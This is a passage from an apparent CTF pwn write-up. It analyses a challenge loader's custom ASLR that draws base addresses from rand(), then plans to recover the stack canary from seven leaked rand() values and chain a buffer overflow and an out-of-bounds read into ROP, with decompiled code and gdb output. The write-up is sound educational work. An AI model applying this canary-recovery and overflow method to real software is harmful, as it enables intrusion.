</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#99f">LAB_00401af9</span>:
</span></span><span style="display:flex;"><span>    local_22 <span style="color:#555">=</span> local_22 <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Quite long, but basically, it is used to load each object file those were given in the challenge. There are 7 files, so the method <code>load_o_phase_1</code> will be called 7 times. We just need to go to the important LOC in the <code>load_o_phase_1</code> method.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>uVar3 <span style="color:#555">=</span> aslr_get_addr(<span style="color:#555">*</span>(ushort <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">+</span> <span style="color:#f60">0x3c</span>) <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p>On each load, the method will call <code>aslr_get_addr</code>. Let&rsquo;s check this method.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ulong <span style="color:#c0f">aslr_get_addr</span>(<span style="color:#078;font-weight:bold">int</span> param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined4 extraout_var;
</span></span><span style="display:flex;"><span>  ulong uVar2;
</span></span><span style="display:flex;"><span>  ulong uVar3;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#555">=</span> rand();
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#555">=</span> CONCAT44(extraout_var,iVar1) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">0x1c</span>;
</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#555">=</span> sys_mmap(uVar2,param_1 <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">0xc</span>,<span style="color:#f60">3</span>,<span style="color:#f60">0x100022</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (uVar3 <span style="color:#555">&lt;</span> <span style="color:#f60">0xfffffffffffff000</span>) <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;note: candidate address occupied&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (uVar3 <span style="color:#555">!=</span> uVar2) {
</span></span><span style="display:flex;"><span>    die(<span style="color:#c30">&#34;No idea. Should not happen.&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  sys_munmap(uVar3,param_1 <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">0xc</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> uVar3;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Checking through the assembly, the <code>edi</code> is set to 0xc before calling the <code>rand()</code> method.
<p class="markdown-image">
  <img src="https://i.imgur.com/OFroRDt.png" alt=""  />
</p></p>
<p>Now we have found the custom aslr method! Turn out, the way it does the ASLR is, it will call <code>rand()</code> method to get 12-bits (0xc) of a random number, and use this value as the first 12-bit base address of the loaded object file. After getting this base address, later on, the object file method will be mapped to the generated address.</p>
<p>And checking through Ghidra, after initializing the canary stack value, <code>rand()</code> will be only called during assigning the aslr of the loaded object via this method. You can see in below picture that <code>rand()</code> is only used in <code>init_stack_guard</code> (0x402163) and <code>aslr_get_addr</code> (0x40160c) method.
<p class="markdown-image">
  <img src="https://i.imgur.com/jWXxfiQ.png" alt=""  />
</p></p>
<p>Remember from the previous analysis, that if we somehow manage to get the n <code>rand()</code> call values after the call of <code>init_stack_guard</code>, we might be able to recover the <code>rand_state</code> after the <code>init_stack_guard</code> call, which is equivalent to the <code>canary</code> value set in our binary. And turn out, each of the n <code>rand()</code> call values is used as the aslr base address of each loaded file.</p>
<p>So, if we&rsquo;re somehow able to retrieve these aslr addresses (which is constructed from the <code>rand()</code> value result), it will be great for us, because that means we will be able to recover consecutive <code>rand()</code> results, where the <code>rand()</code> call is based on a <code>rand_state</code> that is equivalent to the <code>canary</code> value. And using these recovered values, we will try to reconstruct the initial <code>rand_state</code> (which is our <code>canary</code>).</p>
<p>To summarize, <code>loader</code> will load 7 object files (because we were given 7 object files in the challenge), which means there will be 7 consecutive calls to <code>rand()</code> after the <code>rand_state</code> is equivalent to <code>canary</code> value. And our target is to leak these 7 aslr addresses.</p>
<h5 id="run-the-main-program">Run the main program <a href="#run-the-main-program" class="anchor">#</a></h5>
<p>Well yeah, after the <code>loader</code> finished all of its object files, it will run the <code>main</code> program, which run the methods defined in the <code>game.o</code> file.</p>
<h3 id="exploitation-plan">Exploitation Plan <a href="#exploitation-plan" class="anchor">#</a></h3>
<p>Now we have finished our initial analysis, we will need to craft a plan. From the above initial analysis, what we have gathered so far:</p>
<ul>
<li>We can leak the <code>canary</code> value if we&rsquo;re able to retrieve the <code>rand()</code> results of the <code>aslr_get_addr</code> value, which is the aslr base address of each loaded object file region.</li>
<li>There is BOF in the <code>get_player_name</code> method.
<ul>
<li>This indicates that to be able to perform ROP, we will need to play the game until we got into the scoreboard + we need <code>canary</code> value.</li>
</ul>
</li>
<li>There is OOB in the <code>see_scoreboard</code> method.
<ul>
<li>We need to be able to leak some useful values</li>
<li>Hopefully, with this OOB, we can leak the <code>rand()</code> results.</li>
</ul>
</li>
</ul>
<h4 id="recover-rand-value">Recover rand() value <a href="#recover-rand-value" class="anchor">#</a></h4>
<p>Our first step will be recovering the <code>rand()</code> values which are used as the aslr of each loaded object region.</p>
<p>So, let&rsquo;s try to set up our gdb and then explore how the values are initialized. This is my breakpoint setup</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>b *init_stack_guard+85
</span></span><span style="display:flex;"><span>b *aslr_get_addr+37
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first breakpoint will be used to get the <code>canary</code> value just for sanity checking. The second breakpoint will be used to retrieve the <code>rand()</code> result of the <code>aslr</code> method.</p>
<p>Let&rsquo;s try stepping on the gdb.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$rax   : 0x75924ac4cc2d256a
</span></span><span style="display:flex;"><span>$rbx   : 0x0               
</span></span><span style="display:flex;"><span>$rcx   : 0x3a              
</span></span><span style="display:flex;"><span>$rdx   : 0x75924ac4cc2d256a
</span></span><span style="display:flex;"><span>$rsp   : 0x007fffffffdcb8  ‚Üí  0x0000000000000008
</span></span><span style="display:flex;"><span>$rbp   : 0x007fffffffdcc8  ‚Üí  0x007fffffffdcf8  ‚Üí  0x0000000000000000
</span></span><span style="display:flex;"><span>$rsi   : 0x007ffff7ff8000  ‚Üí  0x0000000000000000
</span></span><span style="display:flex;"><span>$rdi   : 0x3a              
</span></span><span style="display:flex;"><span>$rip   : 0x00000000402168  ‚Üí  &lt;init_stack_guard+85&gt; mov rdi, rax
</span></span><span style="display:flex;"><span>$r8    : 0x0               
</span></span><span style="display:flex;"><span>$r9    : 0x0               
</span></span><span style="display:flex;"><span>$r10   : 0x22              
</span></span><span style="display:flex;"><span>$r11   : 0x206             
</span></span><span style="display:flex;"><span>$r12   : 0x0               
</span></span><span style="display:flex;"><span>$r13   : 0x0               
</span></span><span style="display:flex;"><span>$r14   : 0x0               
</span></span><span style="display:flex;"><span>$r15   : 0x0               
</span></span><span style="display:flex;"><span>$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
</span></span><span style="display:flex;"><span>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
</span></span><span style="display:flex;"><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ stack ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style="display:flex;"><span>0x007fffffffdcb8‚îÇ+0x0000: 0x0000000000000008	 ‚Üê $rsp
</span></span><span style="display:flex;"><span>0x007fffffffdcc0‚îÇ+0x0008: 0x007ffff7ff8000  ‚Üí  0x0000000000000000
</span></span><span style="display:flex;"><span>0x007fffffffdcc8‚îÇ+0x0010: 0x007fffffffdcf8  ‚Üí  0x0000000000000000	 ‚Üê $rbp
</span></span><span style="display:flex;"><span>0x007fffffffdcd0‚îÇ+0x0018: 0x000000004023e8  ‚Üí  &lt;_start+42&gt; mov DWORD PTR [rbp-0x4], 0x0
</span></span><span style="display:flex;"><span>0x007fffffffdcd8‚îÇ+0x0020: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x007fffffffdce0‚îÇ+0x0028: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x007fffffffdce8‚îÇ+0x0030: 0x0000000000000000
</span></span><span style="display:flex;"><span>0x007fffffffdcf0‚îÇ+0x0038: 0x0000000000000000
</span></span><span style="display:flex;"><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ code:x86:64 ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style="display:flex;"><span>     0x402159 &lt;init_stack_guard+70&gt; call   0x40100d &lt;syscall2&gt;
</span></span><span style="display:flex;"><span>     0x40215e &lt;init_stack_guard+75&gt; mov    edi, 0x40
</span></span><span style="display:flex;"><span>     0x402163 &lt;init_stack_guard+80&gt; call   0x40146c &lt;rand&gt;
</span></span><span style="display:flex;"><span> ‚Üí   0x402168 &lt;init_stack_guard+85&gt; mov    rdi, rax
</span></span><span style="display:flex;"><span>     0x40216b &lt;init_stack_guard+88&gt; call   0x401064 &lt;write_stack_guard&gt;
</span></span><span style="display:flex;"><span>     0x402170 &lt;init_stack_guard+93&gt; nop    
</span></span><span style="display:flex;"><span>     0x402171 &lt;init_stack_guard+94&gt; leave  
</span></span><span style="display:flex;"><span>     0x402172 &lt;init_stack_guard+95&gt; ret    
</span></span><span style="display:flex;"><span>     0x402173 &lt;pivot_to_main+0&gt; endbr64 
</span></span><span style="display:flex;"><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ threads ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style="display:flex;"><span>[#0] Id 1, Name: &#34;loader&#34;, stopped 0x402168 in init_stack_guard (), reason: BREAKPOINT
</span></span><span style="display:flex;"><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ trace ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style="display:flex;"><span>[#0] 0x402168 ‚Üí init_stack_guard()
</span></span><span style="display:flex;"><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style="display:flex;"><span>gef‚û§  
</span></span></code></pre></td></tr></table>
</div>
</div><p>We hit our first breakpoint, and <code>rax</code> is the <code>canary</code> value.</p>
<p>Let&rsquo;s continue and take notes on the <code>rax</code> value on each breakpoint because it is the <code>rand()</code> result. I won&rsquo;t display the result here because it&rsquo;s too long.</p>
<p>After stepping 7 times, these are the <code>rand()</code> consecutive results (which are retrieved from <code>rax</code> values on each break).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x42f, 0xf90, 0x97e, 0x7ab, 0xc92, 0x6fe, 0xf0b
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s check the vmmap to confirm that this 12-bits number is indeed used as the base address of each loaded object.</p>
